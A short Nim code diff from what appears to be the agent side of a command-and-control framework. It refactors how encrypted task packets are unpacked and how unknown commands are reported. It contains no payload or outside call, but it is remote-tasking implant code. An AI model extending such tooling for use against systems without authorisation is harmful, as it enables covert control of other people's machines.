@@ -6,12 +6,12 @@ import ../../common/[types, serialize, sequence, crypto, utils]
 proc handleTask*(config: AgentConfig, task: Task): TaskResult = 
     try: 
         return getCommandByType(cast[CommandType](task.command)).execute(config, task)
-    except CatchableError: 
-        echo "[-] Command not found."
+    except CatchableError as err: 
+        echo "[-] Invalid command. " & err.msg 
 
 proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task = 
 
-    var unpacker = initUnpacker(bytes.toString)
+    var unpacker = Unpacker.init(Bytes.toString(bytes))
 
     let header = unpacker.deserializeHeader()
 
@@ -23,7 +23,7 @@ proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task =
     let decData= validateDecryption(config.sessionKey, header.iv, payload, header.seqNr, header)
 
     # Deserialize decrypted data
-    unpacker = initUnpacker(decData.toString)
+    unpacker = Unpacker.init(Bytes.toString(decData))
 
     let 
         taskId = unpacker.getUint32()
@@ -54,7 +54,7 @@ proc deserializePacket*(config: AgentConfig, packet: string): seq[Task] =
 
     result = newSeq[Task]()
 
-    var unpacker = initUnpacker(packet) 
+    var unpacker = Unpacker.init(packet) 
 
     var taskCount = unpacker.getUint8()
     echo fmt"[*] Response contained {taskCount} tasks."
